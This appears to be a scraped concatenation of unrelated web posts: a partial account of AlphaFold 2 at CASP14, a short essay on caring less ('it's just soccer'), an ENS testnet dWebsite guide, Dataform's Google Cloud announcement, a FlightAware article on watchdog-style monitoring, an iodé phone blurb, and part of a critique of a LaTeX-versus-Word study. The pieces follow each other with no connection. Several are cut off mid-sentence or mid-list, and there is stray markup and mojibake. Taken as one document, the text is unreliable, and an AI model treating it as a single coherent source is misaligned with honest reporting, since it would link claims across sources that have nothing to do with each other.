<div><figure><img loading="lazy" width="625" height="435" src="https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?resize=625%2C435&amp;ssl=1" alt="" srcset="https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?resize=1024%2C712&amp;ssl=1 1024w, https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?resize=300%2C209&amp;ssl=1 300w, https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?resize=768%2C534&amp;ssl=1 768w, https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?resize=624%2C434&amp;ssl=1 624w, https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?w=1143&amp;ssl=1 1143w" sizes="(max-width: 625px) 100vw, 625px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?resize=1024%2C712&amp;ssl=1 1024w, https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?resize=300%2C209&amp;ssl=1 300w, https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?resize=768%2C534&amp;ssl=1 768w, https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?resize=624%2C434&amp;ssl=1 624w, https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?w=1143&amp;ssl=1 1143w" data-lazy-src="https://i0.wp.com/www.blopig.com/blog/wp-content/uploads/2020/12/MicrosoftTeams-image-1.png?resize=625%2C435&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Combined results of all the CASP competitions. The dark orange line (CASP14_serv) corresponds to the predictions made by fully automated servers, the olive green line (CASP14_w/o427) includes all predictions assisted by humans except for the highest performing group; and the black line (CASP14) represents the predictions by the best performing team: Group 427, or AlphaFold 2. This plot uses the GDT_TS score, where 100 represents perfect results and 0 is a meaningless prediction.</figcaption></figure></div>



<p>As a rule of thumb, a GDT_TS around 60% represents a “correct fold”, meaning that we have an idea of how the protein folds globally; and over 80% we start seeing side chains that closely resemble the model. As you can see, AlphaFold 2 achieves this objective for all but a small percentage of the tasks.</p>



<p>And then, after three decades of competitions, the assessors declared that AlphaFold 2 had succeeded in solving a challenge open for 50 years: to develop a method that can accurately, generally and competitively predict a protein structure from its sequence (or, well, a multiple sequence alignment, as we will see later). There are caveats and edge cases, as in any application — but the magnitude of the breakthrough, as well as its potential impact, are undeniable.</p>



<p>The story does not end there. The models produced by AlphaFold 2 were so good that in some cases defied the results of the experiment. I will provide two brief examples, based on examples mentioned in the conference. The first example comes from the group of <a href="http://www.chem.umd.edu/faculty-staff-directory/facultydirectory/osnat-herzberg">Osnat Herzberg</a>, who were studying a phage tail protein. After appreciating the excellent agreement of DeepMind’s model with their structure, they noticed that they had a different assignment for a cis-proline. Upon reviewing the analysis, they realised they had made a mistake in the interpretation and corrected it.</p>



<p>The second comes from the group of <a href="https://www.chemie.uni-hamburg.de/en/institute/bc/arbeitsgruppen/tidow/personen/tidow-henning.html">Henning Tidow</a>, who was studying an integral membrane protein, the reductase FoxB (apparently related to iron uptake in Gram-negative bacteria). Prof. Tidow’s group worked on this model for about two years, trying different methodologies to solve the crystal structure, including <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5947774/">experimental phasing</a> methods. When they were given the models from DeepMind’s prediction, they managed to solve the problem by <a href="https://en.wikipedia.org/wiki/Molecular_replacement#:~:text=Molecular%20replacement%20(or%20MR)%20is,the%20diffraction%20data%20is%20derived.">molecular replacement</a> in a matter of hours.</p>



<p>There is one last point to clear. Some people have wondered if Google’s incredible success is not perhaps related to an easier set of target proteins this year. This is, <em>per se</em>, a difficult claim to sustain (after all, wouldn’t other groups with much more experience have also benefited from this?), but to disprove this point the assessors have concluded that the targets for CASP14 were the most difficult to date, based on the similarity of existing protein structures to the targets:</p>

On both counts, CASP14 includes the most difficult free-modelling (FM) targets yet provided. TBM stands for Template Based Models.</figcaption></figure></div>



<p>There are still many interesting points of discussion. Many will argue that the set of targets studied at CASP14 is not representative of <em>all</em> interesting structural prediction problems — and they will be right. And, yes, certainly there are some problems where AlphaFold 2 hasn’t performed that well. I will give you my thoughts on some of the caveats later, when we near the end of this blog post. But, for now, let’s be clear on something: AlphaFold 2 is a tool that can solve the protein structure prediction <em>for a very significant number of targets</em>.</p>



<h2>How does this compare to other methods?</h2>



<p>I might have convinced you that AlphaFold 2 is a massive breakthrough. Now it is time …</p></div></div>

<p>I spent a few years working on a project for a big soccer league. One guy on the team had spent some time back in the day writing embedded software for medical equipment. He came from a world where a bug could mean someone dies. </p>



<p>Whenever something broke on the league’s website, say the stats were wrong or live scores weren’t updating, <a href="https://critter.blog/2020/12/02/we-become-what-we-are-told-we-are/">everyone lost their crap</a> except for that guy. “It’s just soccer,” he said as he fixed everything. “<a href="https://critter.blog/2020/11/04/what-we-have-left/">Nobody’s going to die</a>.”</p>



<p>He taught me that sometimes we all need to care just a <em>little bit </em>less.</p>



<p><a href="https://twitter.com/m_ashcroft/status/1264499790865408000">A Twitter thread</a> reminded me of that guy recently. The thread talks about the difference between being “serious” and “sincere” in life. </p>



<p>Ever played a game against someone who forgot it was a game? My grandmother is like that with the card game Bridge. Bridge is not entertainment for her. It’s about pride and victory. She’s “serious” about Bridge.</p>



<p>Nobody likes playing a game against someone like that. It <a href="https://critter.blog/2020/10/28/the-all-powerful-bad-apple/">takes the fun out of it</a> for everyone.</p>



<p>If she were able to keep the passion and the dedication but still have fun with it, then she’d be “sincere” about Bridge. Sincere people still care just as much as serious people, but <a href="https://critter.blog/2020/11/17/stop-trying-to-be-impressive-start-trying-to-be-warm/">in a different way</a>. Sincere people remember that it’s a game and don’t get all in a tizzy when things don’t go their way. Sincere people know that “it’s just soccer.”</p>



<p>I heard a description of <a href="https://www.iheart.com/podcast/105-stuff-you-should-know-26940277/episode/what-exactly-is-stoicism-29467386/">Stoicism on a podcast</a> a few months back. They talked about how life always tries to get your goose, and Stoicism is the art of “preventing your goose from becoming gotten”. That’s sincerity.</p>



<p>Can we stop being so “serious” about the game that is life and start being “sincere” about it? Can we keep the passion, hard work, and growth but swap the upset-edness for silliness and joy? </p>



<p>After all, it’s just soccer.</p>

  </p>

  
  

  <p>This is developers guide for building dWebsites in testnet. It follows an example of making a dWebsite, <code>tutorial.eth</code> in Rinkeby testnet.</p>

<p>The guide is comprehensive, trying to fill in all aspects of making a testnet dWebsites. We divided it into many subsections, so you can easily read only the topics relevant to you.</p>

<p><em>Note</em>: testnet dWebsites are not safe! They may be deleted, modified, or removed. When you buy a testnet name there is no guarantee this name will be there the following day. Testnet dWebsites are meant for developers to test their products before putting it on the “real” Ethereum.</p>

<h2 id="prerequisites-almonit-browser-extension">Prerequisites: Almonit Browser Extension</h2>
<p>You will need the latest version Almonit Browser Extension to complete this guide. It includes testnet dWesbites support.</p>

<p>Install it either versions for <a href="https://addons.mozilla.org/en-US/firefox/addon/almonit/">Firefox</a> or for <a href="https://chrome.google.com/webstore/detail/almonit/adobfkcnfkodjfobnndpfipdanhdcafm">Chromium-based browsers</a>, like Chrome, Brave, Opera etc.</p>

<h2 id="choosing-an-ethereum-testnet">Choosing an Ethereum testnet</h2>
<p>Currently, our browser extension supports ENS in two Ethereum testnets, Ropsten, and Rinkeby. What’s the difference between them?</p>

<p>Ropsten is an unsecured proof-of-work (PoW) blockchain. Since Ropsten is PoW, just like Ethereum’s mainnet,  Ropsten simulates the bests how dApps behave in Ethereum. However, Ropsten is relatively slow (block time 30 seconds, compared to 15 seconds of Rinkey), exposed to spamming attack (where someone spams the blockchains with many transactions, making it impossible for anyone else to you), while not being eco-friendly.</p>

<p>Rinkeby is a proof-of-authority (PoA) blockchain, meaning it’s being operated by a small known group of trusted entities.  PoA blockchains are both very eco-friendly and immune to spamming attacks. However, they simulate Ethereum less accurately, and to get tokens for them you need to use social media (brrrr).</p>

<p>You can <a href="https://ethereum.stackexchange.com/questions/27048/comparison-of-the-different-testnets">find here</a> excellent detailed analysis of the differences between all the testnets.</p>

<p>ENS is also deployed on Goerli testnet. However, Goerli is not supported by the current version of Almonit browser extension so we don’t dwell on it here.</p>

<h2 id="how-to-get-testnet-tokens">How to get testnet tokens?</h2>
<p>First, switch your wallet to testnet. In Metamask, for example, it’s done a select box in the wallet popup.</p>

<p><img src="http://blog.almonit.eth.link/resources/images/Almonit-extension-testnet-developers-guide/metamask_testnet.jpg"></p>

<p>We recommend creating a new account only for testnet. Don’t use the same accounts for mainnet and testnet activities, as it’s an invitation for crucial accidents.</p>

<p>Getting testnet tokens depends on which testnet you use.</p>

<ol>
  <li>
    <p><strong>Ropsten</strong>. Super easy! Go to a <a href="https://faucet.ropsten.be/">Ropsten faucet</a>, enter your Ropsten wallet address, and click ‘Send me test Ether’. That’s all!</p>
  </li>
  <li>
    <p><strong>Rinkeby</strong>. We use a <a href="https://faucet.rinkeby.io/">Rinkey faucet</a>. The process has <em>two</em> steps, meant to protect Rinkeby from spamming attacks.</p>

    <p>Step 1: Make a Twitter or Facebook post with your account address.</p>

    <p><img src="http://blog.almonit.eth.link/resources/images/Almonit-extension-testnet-developers-guide/Rinkeby_twitter_request.jpg"></p>

    <p>Step 2: Paste the URL of your post into the faucet.</p>

    <p><img src="http://blog.almonit.eth.link/resources/images/Almonit-extension-testnet-developers-guide/Rinkeby_faucet.jpg"></p>
  </li>
</ol>

<h2 id="buy-ens-name-in-testnet">Buy ENS name in testnet</h2>
<p>Once you have testnet tokens, you can buy an ENS testnet name! We demonstrate the process on Rinkeby testnet, though it’s identical for all of them.</p>

<ol>
  <li>
    <p>Switch your wallet to the testnet you’re buying a name in (see the previous section for how it’s done in Metamask).</p>
  </li>
  <li>
    <p>Go to the <a href="https://app.ens.domains/">ENS app</a>. Verify, at the upper left corner of the app, that it works in the correct testnet.</p>
  </li>
  <li>
    <p>Enter the name you want to buy and press search. You can choose between a <code>.eth</code>  or  a<code>.test</code>. The difference is in the purchase process. A <code>.eth</code> name imitates the purchase process of mainnet ENS names, and hence is a bit slow. a <code>.test</code> name is much faster to buy.</p>

    <p><strong>Note</strong>: at the time of writing this post <code>.test</code> names don’t work in testnet. However, we leave it here for the instructions to be valid once ENS fix this.</p>
  </li>
  <li>
    <p>Press <code>Register</code>, and follow the instructions till you obtain the name.</p>
  </li>
</ol>

<p>Congratulations! You just bought an ENS name in testnet!</p>

<h2 id="create-your-first-testenet-dwebsite">Create your first testenet dWebsite</h2>
<ol>
  <li>In ENS App, go to the manage screen of the name you bought in the previous step.</li>
  <li>Press ‘add/edit record’</li>
  <li>Insert an IPFS CID of a dWebsite in the content field. For example, this CID would give you a cool ‘ALmonit Tutorial’ dWebsite: <code>ipfs://QmTXWx6pLwYoX3HUGxyM7qCR3qF9MdtRMcC3fx8qnnUHU2</code></li>
  <li>Press ‘Confirm’ and confirm the transaction in your wallet.</li>
</ol>

<h2 id="browse-to-your-dwebsite">Browse to your dWebsite</h2>
<p>First, enable testnet support in Almonit Browser extension using those steps.</p>

<ol>
  <li>
    <p>In the Almonit popup in yoru browser, press the settings button: <img src="http://blog.almonit.eth.link/resources/images/Almonit-extension-testnet-developers-guide/settings.jpg"></p>
  </li>
  <li>
    <p>In the general tab, enable the checkbox of ‘Enable ENS testnet Dwebsites’, and select the testnet you want to use.</p>
  </li>
</ol>

<p>Now you can surf to your website!</p>

<p>You <em>can’t</em> simply enter the name of your testnet dWebsite, because <code>.test</code> and <code>.eth</code> are already reserved for real DNS and real ENS websites.</p>

<p>Instead, you need to replace <code>.test</code> in your name with <code>.teth</code>, and <code>.eth</code> with <code>.testeth</code>.</p>

<p>So, if we made a testnet dWebsite tutorial.test, you’ll have to type <code>http://tutorial.teth</code> in your address bar to access it. Or, if we made a test dWebsite tutorial.eth, you could access it by typing in the address bar <code>http://tutorial.testeth</code>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Today we're excited to announce that we've joined Google Cloud. Over the course of the past several months, our partnership with Google Cloud has deepened and we believe that our new combined efforts can make our customers and partners even more successful.</p><div><div><p>To our customers, users, supporters and contributors - today, we are extremely excited to share that Dataform is joining Google Cloud!</p>
<p>Before we jump into the story, let us quickly answer what we think will be the most important questions for existing and new users:</p>
<ul>
<li>Dataform Web will continue to be run and maintained by us, as part of Google Cloud.</li>
<li>Dataform Web will be free for all new users as of today, December 8th 2020.</li>
<li>Existing customers will be transitioned onto the free plan immediately.</li>
<li>Dataform Web will focus on support for BigQuery going forward.</li>
<li>Weâ€™ll be working closely with the rest of the Google Cloud Data Analytics team over the next year to deliver our vision for Dataform within Google Cloud.</li>
</ul>
<p>Three years ago we started Dataform with a mission to <strong>empower analysts to manage the entire flow of data in the warehouse, using a single, unified workflow</strong>. Throughout our journey weâ€™ve been focused on giving data analysts and data engineers the tools they need to take raw, messy data, transform it, and put it into the hands of their organization. Weâ€™ve only just scratched the surface of this problem and solving it will continue to be our core mission and focus going forward.</p>
<p>Weâ€™ve followed Googleâ€™s products and successes within analytics closely over the past few years, and always felt that they were a product leader when it came to cloud data warehousing, SQL, and now business intelligence; with products such as Looker that inspired us significantly in our own journey. After several conversations with the Google Cloud team it became clear that we are deeply aligned on the importance of serving analysts with the right tools and technology in order to fill what we all perceive as a missed opportunity in existing solutions.</p>
<p>At the same time, as a team of just 7, in a complex, competitive and rapidly changing market, we had more ideas than we had people or resources to accomplish. There has always been so much more we wanted to do each quarter than we could achieve. With the support of the BigQuery and Cloud Analytics teams and our combined thought leadership and efforts, we felt that together we could achieve something bigger than we could separately.</p>
<p>There will inevitably be some changes to the product and how we operate over the coming years, but one thing that will not change is our commitment to the principles that we feel have gotten us this far: working closely with our customers, making sure we continue to collect and act upon your feedback, and a laser focus on doing one thing and doing it well.</p>
<p>At Dataform we always felt we were delivering a unique and innovative product to our customers and the data community. With Googleâ€™s support, we have even more confidence in our ability to build and deliver a product that can truly change the way that all companies, large and small, work with data. </p>
<p>In the coming months weâ€™ll be able to share more details of our product roadmap. In the meantime please reach out to us if you have any questions. Thank you again for joining us on this journey. Weâ€™re uncomfortably excited about what we can accomplish together over the coming years!</p>
<p>Guillaume-Henri Huon &amp; Lewis Hemens, co-founders of Dataform</p></div></div></div>]]>

				<p><em>Take lessons from high stakes monitoring in the physical world (electrical grids, nuclear power plants, oil rigs, data centers) and apply them to a pure software stack.</em></p><p><em>Karl Lehenbauer is FlightAware</em>’<em>s Chief Technology Officer. </em></p><p>Little is worse for someone committed to providing reliable service than to have your customer call you to tell you your service isn’t working. It’s a double whammy. You’re broken and you don’t know you’re broken. You hate that. So do we. Worse, we have service level agreements with many of our customers— if a service isn’t working for long enough, we have to start dishing out refunds.</p><p>But far more important than that, if we’re down our customers don’t know where their airplanes are. This can be a regulatory violation. It can also mean that the line service technicians aren’t available to meet the plane (if you travel much at all you’ve heard the pilot come on the PA and announce, “Well folks, we’ve arrived but the ground crew isn’t here to help get us into the gate”). Then you sit on the plane in the alleyway until the wing walkers, jetway driver, baggage handlers, etc., show up to guide the plane in.</p><p>But more than that, we provide Global Aviation Distress and Signaling System (GADSS) <a href="https://globalbeacon.aero/">surveillance</a> to lots of airlines as mandated by the International Civil Aviation Organization. They might literally not know that one of their airplanes is in distress or has some kind of incident or even has crashed if our stuff isn’t working properly. People’s lives are on the line.</p><p>Let’s go back in time a bit.</p><h2 id="monitoring-the-real-world">Monitoring the Real World</h2><p><br>I got my start in control systems, first at a power company, monitoring and controlling electrical power generation, transmission and distribution. Later, I went to work at a vendor of those systems, followed by a stint at GE Aircraft Instruments working on turbine engine monitoring.</p><p>By the early 1990s I was leading the engineering team for a very early Internet Service Provider.</p><p>One day, our air conditioning failed. The computer room overheated, we lost some disk drives, and I resolved that we should be alerted if it ever started happening again.</p><p>This was before you could read the air inlet temperature off of your high-end router or from your fancy air conditioner or from one of the inexpensive SNMP-enabled temperature monitoring solutions of today.</p><p>So we came up with a clever solution. We’d use an old school thermostat, wire the transmit pin of a computer’s serial port through the thermostat’s mercury switch to the port’s receive pin, and we’d send a character through the serial port every few seconds. If the computer room went above a threshold temperature, the blob of mercury would complete the circuit and we’d start reading the characters back from the serial port. Then our little program would recognize this and start sending messages to peoples’ pagers using a modem.</p><figure><img src="https://flightaware.engineering/content/images/2020/12/Image-1-.png" alt="" srcset="https://flightaware.engineering/content/images/size/w600/2020/12/Image-1-.png 600w, https://flightaware.engineering/content/images/size/w1000/2020/12/Image-1-.png 1000w, https://flightaware.engineering/content/images/size/w1600/2020/12/Image-1-.png 1600w, https://flightaware.engineering/content/images/2020/12/Image-1-.png 1920w" sizes="(min-width: 720px) 720px"></figure><p>Fine.</p><p>Lo and behold, one day we partially lost cooling in the data center, only we didn’t get any callouts. An investigation revealed that one of the wires had gotten janked, and though the blob of mercury made contact, no characters were received by the monitoring program.</p><p>Meditating on this led to a critical insight. <em>We had it backwards! </em>Rather than completing the circuit when there was a problem, we needed instead to make the circuit normally closed and open it when there was a problem. Instead of wiring into the air conditioning contacts of the thermostat we would wire into the heating ones. We would receive the characters we were sending as long as everything was OK. If the temperature rose past a threshold, the blob of mercury would pull away from the contacts, breaking the circuit, so whenever our program <strong>stopped</strong> seeing the characters, the alarm would be raised.</p><p>By flipping it like this, if one of the wires got inadvertently pulled or whatever, we’d immediately get the alarm.</p><p>In other words, <strong>the lack of a signal telling you everything is OK means something is wrong.</strong></p><h2 id="on-the-trail-of-monitoring-your-applications">On the Trail of Monitoring Your Applications</h2><p>Now, consider we have a service and we want to make sure it’s working. Can I ping the machine or machines? Great. The machine is up. Or is it? Ping is pretty basic in the network stack; ping packets are typically responded to directly from the kernel. We’ve seen machines that are pretty crashed and won’t run programs that will still ping.</p><p>OK, so we’ll ping the machine, but we’ll have some kind of agent program that runs on the machines that we’ll talk to over the network. If we can talk to the agent, then we know a little more that the machine is working. But does the machine have enough storage? Does it have enough memory? OK, we’ll make our agent check and alert us if the machine is low on storage or memory, if the swap utilization is abnormally high, etc.</p><p>But is the program running? Sure, no problem. We’ll add some code to our agent to read the process table and see if the program shows up there. If it doesn’t, we’ll alarm.</p><p>But is the program getting work done? The process might exist, but it might not be doing anything. Well we could read the program’s CPU time repeatedly and see if it’s accumulating time.</p><p>But does that mean it’s working? No, it doesn’t. Maybe it’s lost its database connection. Maybe it’s accumulating CPU time but because it wasn’t written defensively enough, it’s trying to do database updates and failing and logging errors but not reconnecting to the database.</p><p>Maybe it’s got a good connection to the database server but it’s not receiving any messages.</p><p>You can keep increasing the sophistication of your agent. You can keep adding new checks as you discover (usually the hard way) new failure modes you missed, but with this approach you’re vulnerable to any new or unanticipated breakdowns. You might never be completely sure work is getting done.</p><h3 id="in-the-loop-monitoring">In-the-Loop Monitoring</h3><p>I assert that you can’t know your program is doing the work it’s supposed to be doing unless it’s telling you that it is. Call this “in-the-loop” monitoring. If a program is expected to repeatedly receive input messages and update a table in a database, then every time it has done this it should send a message to monitoring software reporting that it has successfully done it.</p><p>It should only send the success message to the monitoring program upon completion of the work. So once an input message has been received, successfully processed, and the database updated, a separate message is sent to the monitoring software saying it has succeeded. If no input message is received or the database update fails, the message should not be sent to the monitoring software.</p><p>To reiterate, you make a call from inside the program to send a message to your monitoring software every time the program succeeds in doing a parcel of work.</p><p>Meanwhile, if a certain amount of time passes without the monitoring program receiving a “work completed” message, it raises an alarm that something is wrong.</p><p>The beautiful thing here is that the monitoring program doesn’t have to know why it didn’t receive a message. We don’t have to try to check for every possible reason. All we have to do is recognize that we stopped being told it was OK. The machine may have crashed, the router may have failed, the program may have lost its receive socket or its database connection. The program feeding data to our program may have stopped sending, the ethernet cable may have gotten pulled, a circuit breaker may have tripped, the program may have divided by zero or gotten a memory protection violation, there could have been an earthquake, a flood… locusts! We don’t have to check for all those things. All we have to do is recognize that the program stopped telling us it was OK.</p><h3 id="watchdog-timers">Watchdog Timers</h3><p>What I’m describing is a variation of a <a href="https://en.wikipedia.org/wiki/Watchdog_timer">watchdog timer</a>, technology common in real-time systems, space probes, satellites, etc., where software on a computer periodically resets a hardware timer. The hardware timer counts down, but every time the reset signal is received the counter is reset. If for any reason the software stops resetting the hardware timer, the counter eventually reaches zero and triggers a reboot or some other corrective action. Our variation is much more granular and is software-based, but the principle is the same.</p><h2 id="on-the-trail-of-watchdog-resets-in-the-modern-production-software-stack">On the Trail of Watchdog Resets in the Modern Production Software Stack</h2><p>Now, if your program is processing 40,000 messages a second, it needn’t send 40,000 messages a second to your monitoring system saying it’s completed work. So the watchdog reset subroutine can have a threshold and only send a completion message once a second or whatever, regardless of how many messages it processed. Fine.</p><p>Also, the watchdog reset subroutine must never break the program! So if it can’t reach the monitoring server, the program should keep going regardless. The program shouldn’t freeze if the monitoring software stops responding. For this reason our in-the-loop code has been kept very simple, and uses UDP datagrams to send watchdog resets to the monitoring software. It also makes sure that even if there is an error returned, which can happen even with UDP if the sender and recipient are on the same LAN, that it doesn’t stop or break the program.The watchdog reset message should identify the program, the machine (typically), and perhaps the activity within the program that has succeeded. Examples include the receipt of a message from the FAA, from Aireon’s Space-Based ADS-B network, from our provider of airline schedules, from each of our multiplexing agents that aggregate data from our tens of thousands of ADS-B ground stations, or from <a href="https://flightaware.com/about/datasources/">HyperFeed</a>®, our suite of programs that process all the input data to produce our coherent feed of what is happening with all the aircraft that are in the air or moving on the ground in the world.</p><figure><img src="https://flightaware.engineering/content/images/2020/12/Image-2-4.png" alt="" srcset="https://flightaware.engineering/content/images/size/w600/2020/12/Image-2-4.png 600w, https://flightaware.engineering/content/images/size/w1000/2020/12/Image-2-4.png 1000w, https://flightaware.engineering/content/images/2020/12/Image-2-4.png 1330w" sizes="(min-width: 720px) 720px"><figcaption>Watchdog reset call in Python – If one of our 12M+ users hasn’t logged into the website in the last 15 minutes, something’s wrong.</figcaption></figure><p>Creation of watchdog entries in the monitoring software should be zero config.

<p>iodé is an Android based smartphone <strong>freed from Google’s snitches. </strong>iodé <strong>analyses</strong> in real-time<strong> data requests</strong> from your apps and allows you to :</p>
<ul>
<li><strong>see</strong> the identity of all <strong>recipients</strong> and the quantity of data they wish to collect</li>
<li><strong>block</strong> if you want <strong>unwanted recipients</strong> (advertisements, malwares, spams, statistics &amp; trackers)</li>
<li><strong>measure</strong> how<strong> privacy-respectful</strong> your <strong>apps</strong> are</li>

<p>
The boss needed item 3 inserted into a numbered list of hundreds of items.
The intern used a mouse to select the original 3 on the screen,
then typed 4,
then selected the original 4,
then typed 5,
then scrolled down,
then selected the original 5,
then typed 6,
and so on.
Another intern sat watching the screen to make sure there were no mistakes.
</p>
<p>
I happened to be in the room for other reasons.
I remember the horror of watching the beginning of this barbaric editing process.
Those poor interns!
</p>
<p>
When I enter a list of items into the computer,
what I'm typing doesn't look like
</p>
<pre>     1. ...
     2. ...
     3. ...
</pre>
<p>
but more like
</p>
<pre>     * ...
     * ...
     * ...
</pre>
<p>
Each asterisk is a special command to the computer,
telling the computer to automatically display the next number for the reader.
The reader eventually sees
</p>
<pre>     1. ...
     2. ...
     3. ...
</pre>
<p>
but that isn't what I typed.
This small difference produces a tremendous savings of time
whenever I insert an item, or delete an item, or move an item.
</p>
<p>
If I decide later
to skip the numbers
and use bullets instead,
I tell the computer
to introduce each list item with a bullet.
This is one command covering the whole list.
There's also a command that does the same thing
for the whole document.
There isn't separate work for each item.
It's no problem if a coauthor
later wants to change bullets back to numbers.
</p>
<p>
The interns, I suppose,
would be manually changing "1." and "2." and "3."
and so on to "•" and "•" and "•" and so on.
Or maybe they would be trying to figure out
how some search-and-replace feature could do the same thing;
let's hope the document doesn't have a sentence somewhere
that talks about something that happened in the year 2001.
Or maybe the interns would be quitting and finding a better job.
</p>
<p>
[Note added 2020.12.07:
I was expecting that many of my readers
would already be accustomed to relying on the computer
for automatic numbering.
I was surprised, however,
to see some comments along the lines of "Inconceivable!"
from readers unable to imagine
how the interns could have been in a different situation,
going through such a shockingly inefficient revision process.
Here's a hint:
Each item in the list looked like a flush-left paragraph,
like the paragraphs in this blog post,
adjacent to the left margin.
The text being selected by the mouse,
for example to change "3" to "4",
was to the right of the margin,
like the rest of the text in each item.]
</p>
<p>
<b>Abstraction as a time-saver for authors.</b>
This use of asterisks
is just one example of how I'm often typing something more abstract
than what's seen by the ultimate reader.
I don't type "Figure 12" or "see [41]", for example;
I type things like "Figure \ref{network-measurements}" and "see \cite{multiplication-survey}",
and I let the computer automatically convert
"\ref{network-measurements}" and "\cite{multiplication-survey}"
into numbers to display for the reader.
</p>
<p>
With one extra command,
covering the entire document,
I can tell the computer
to include section numbers
as part of all figure numbers in the document,
so that the figures are easier for the reader to find:
e.g., Figures 3.1 and 3.2 and 3.3 are in Section 3.
With another command,
again covering the entire document,
I can tell the computer
to cite all authors by name rather than by number.
</p>
<p>
As another example,
I was recently editing a mathematical paper,
and I decided that a particular concept
would be easier for the reader to remember
if I changed the notation that I was using for the concept.
The notation was all over the paper,
but this change took just a few seconds of editing.
I had given a name to the concept,
had told the computer <i>once</i> to display this name as a particular notation,
and had then typed this name throughout the paper,
so there was only one place where I had to change the notation.
</p>
<p>
Of course one can't,
and shouldn't try to,
prepare in advance for <i>every</i> possible change to a document.
But it's not hard to prepare for the most likely changes.
This small initial effort
saves a tremendous amount of time later.
When I say "small",
I'm including the effort to select a document-creation system
that's designed to
<a href="https://en.wikipedia.org/wiki/LaTeX">make this sort of thing easy</a>.
</p>
<p>
(As a side note,
programmers will recognize this strategy
as an example of the
<a href="https://en.wikipedia.org/wiki/Information%5Fhiding">information hiding</a>
strategy introduced by Parnas,
and will recognize that modern program-creation systems
are designed to make this easy.)
</p>
<p>
Microsoft Word isn't completely missing abstractions,
but these abstractions
are competing for user-interface resources
against features encouraging the user
to work at lower abstraction layers.
The extra effort to use the abstractions
ends up pushing users into doing something simpler,
something that just works now,
and paying heavily for this choice
later when the document is being revised.
</p>
<p>
Have I done a scientific study
<i>proving</i> that Microsoft Word
is less efficient than LaTeX?
No.
I'd love to see a careful study of this topic.
Short-term,
this would help guide new authors to make sensible choices.
Longer-term,
insights from this sort of study could be the basis for further improving
our document-creation systems.
I certainly don't think that the existing systems are perfect.
(<a href="https://cr.yp.to/writing/visual.html">Example.</a>)
</p>
<p>
Imagine, however, that a study looks only at
<i>the time for someone looking at a printout to create a document matching this printout</i>.
This would be blind to the time for subsequent edits.
This would be blind to the suffering of those interns.
This would incorrectly conclude that typing
"1. ... 2. ... 3. ..." and "see [41]"
is more efficient than typing
"* ... * ... * ..." and "see \cite{multiplication-survey}".
It <i>is</i> slightly more efficient in this limited metric,
but it is much less efficient in the metric that matters,
namely the total time spent by the user.
</p>
<p>
<b>An example of a "scientific" study.</b>
At this point you're probably thinking that
nobody could possibly miss such an obvious issue.
This brings me to the main topic of this blog post,
a 2014 peer-reviewed study
<a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0115069">"An Efficiency Comparison of Document Preparation Systems Used in Academic Research and Development"</a>
by two psychologists,
Knauff and Nejasmic ("KN").
</p>
<p>
Participants in the study were given a page of text
and were given a limited time to type the page into the computer.
There were three different types of text:
</p>
<ul>
<li>simple prose with a few footnotes;
</li>
<li>a page with a complicated table of data;
and
</li>
<li>a page with many mathematical formulas.
</li>
</ul>
<p>
Participants were scored
on the basis of how much text they typed and how accurately they typed it.
The time was so rushed that a significant fraction of participants
didn't finish typing the whole page,
even for the case of simple prose.
</p>
<p>
The study considered two document-creation systems:
LaTeX and Microsoft Word,
in each case with "all tools, editors, plug-ins, and add-ons"
that participants were "accustomed to using".
Of course different "add-ons" could have different efficiency,
and of course there are other document-creation systems,
but these are topics for another blog post.
</p>
<p>
The study produced many pages of results,
which I'll summarize by saying that
Word did slightly better on the prose
and much better on the table,
while LaTeX did better on the formulas.
The study authors made no effort to measure any subsequent document-editing step.
</p>
<p>
<b>Slithering from one metric to another.</b>
The fundamental mistake in the KN paper
is the change of cost metric.
</p>
<p>
The original question was how efficiently authors are creating documents:
in particular, how efficiently authors are creating academic research papers.
KN claimed in their title to be comparing "efficiency"
of "document preparation systems used in academic research".
But they then quietly changed this metric in three ways:
</p>
<ul>
<li>
They considered only the efficiency of an initial fragment of the document-creation process,
ignoring the time spent revising documents.
They provided no reason to believe that the efficiency of this fragment
was well correlated with what they had previously claimed to be measuring.
Nothing in their paper acknowledges
the most obvious reason for a negative correlation,
namely that slightly more work at the outset
makes revisions much easier later.
In my experience,
document-creation systems vary in how well they support this work.
</li>
<li>
KN didn't even measure the time taken for this initial fragment of the process.
Instead they imposed a rushed time limit,
and measured how incomplete and inaccurate the resulting document was.
Again they provided no reason to believe that what they measured
was well correlated with what they had previously claimed to be measuring.
Perhaps they were assuming that more mistakes will take more time to fix,
but my experience is that some types of mistakes are much easier to fix than others,
and that document-creation systems vary in the types of mistakes they encourage.
</li>
<li>
KN didn't even measure creating a <i>new</i> document,
which is what academics are actually spending their time doing.
People who were writing papers in the age of typewriters
will remember writing and editing papers <i>by hand</i>
before tediously typing the final pages,
but that was because editing a typed page
ranged from annoying
(<a href="https://en.wikipedia.org/wiki/Correction%5Ffluid">white-out</a>,
or sometimes scissors and tape)
to super-annoying
(retyping the whole page).
Today the initial writing on paper is skipped,
and typing is interleaved in small chunks
with parts of the author's thought process,
making the typing process much less boring.
I'm continually re-reading
and thinking about what I just typed.
Is the error rate of the academic's modern typing process
well correlated with the error rate of the
